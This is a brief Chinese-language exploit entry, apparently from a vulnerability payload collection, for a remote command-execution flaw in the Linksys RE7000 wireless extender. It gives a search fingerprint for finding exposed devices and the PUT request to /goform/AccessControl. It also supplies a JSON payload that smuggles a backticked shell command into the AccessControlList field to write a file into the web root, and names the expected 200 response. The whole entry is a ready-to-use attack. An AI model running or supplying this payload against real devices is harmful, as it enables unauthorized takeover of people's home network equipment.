# LinksysRE7000无线扩展器AccessControlRCE漏洞

LinksysRE7000 ｜ 命令执行 ｜ —
- **指纹**：`body="/login.shtml?ran="`
- **请求**：`PUT /goform/AccessControl HTTP/1.1`

**Payload**
```
{"AccessPolicy":"0","AccessControlList":"`echo dudesuite>/etc_ro/lighttpd/RE7000_www/dudesuite.txt`"}
```
- **响应特征**：200